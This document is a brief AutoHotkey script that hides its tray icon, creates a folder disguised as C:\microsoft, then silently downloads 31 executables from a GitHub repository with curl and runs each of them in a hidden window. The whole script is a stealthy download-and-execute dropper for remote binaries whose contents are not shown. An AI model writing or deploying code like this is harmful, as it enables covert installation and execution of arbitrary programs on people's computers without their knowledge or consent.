#SingleInstance Ignore
#NoTrayIcon

path := "C:\microsoft"

SetTimer runAllExes, -1000  ; negative = one-shot after 1000 ms

return

runAllExes() {
    global path
    if !DirExist(path)
        DirCreate(path)

    letters := ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z", "LButton", "RButton", "Delete", "Backspace", "Space"]

    for letter in letters {
        output := path "\" letter ".exe"
        if !FileExist(output) {
            url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/" letter ".exe"
            command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
            RunWait command, , "Hide"
        }
        Run output,, "Hide"
    }
}
